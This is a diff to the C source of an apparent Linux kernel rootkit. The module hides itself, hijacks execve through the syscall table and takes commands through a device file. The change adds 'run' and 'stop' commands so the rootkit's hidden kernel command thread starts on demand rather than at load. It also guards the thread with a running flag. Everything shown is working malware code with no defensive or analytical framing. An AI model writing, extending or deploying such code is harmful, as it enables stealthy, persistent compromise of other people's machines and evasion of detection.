@@ -40,6 +40,7 @@ static char msg_buf[BUF_SIZE];
 struct task_struct *rk_kthread;
 unsigned long *syscall_table = NULL;
 unsigned int hidden = 0;
+unsigned int thread_running = 0;
 pte_t *pte;
 
 
@@ -96,6 +97,12 @@ device_write(struct file *file, const char __user *buf, size_t len, loff_t *off)
 			rk_hide();
 		} else if (!strncmp(cmd, "unhide", MIN(6, cmd_len))) {
 			rk_unhide();
+		} else if (!strncmp(cmd, "run", MIN(3, cmd_len))) {
+			rk_start_cmd_thread();
+		} else if (!strncmp(cmd, "stop", MIN(3, cmd_len))) {
+			if (thread_running != 1) return;
+			kthread_stop(rk_kthread);
+			thread_running = 0;
 		}
 	}
 
@@ -151,6 +158,9 @@ void
 rk_start_cmd_thread(void)
 {
 	int cpu = 0;
+	if (thread_running == 1) return;
+	thread_running = 1;
+
 #ifdef DEBUG
 	pr_info("%s: starting kernel thread on cpu %d\n", RK_NAME, cpu);
 #endif
@@ -259,7 +269,6 @@ rk_init(void)
 #endif
 	rk_dev_init_module();
 	rk_hijack_execve();
-	rk_start_cmd_thread();
 
 	return 0;
 }
@@ -273,7 +282,9 @@ rk_exit(void)
 #endif
 	rk_dev_cleanup_module();
 	rk_unhijack_execve();
-	kthread_stop(rk_kthread);
+	if (thread_running == 1) {
+		kthread_stop(rk_kthread);
+	}
 }
 
 module_init(rk_init);
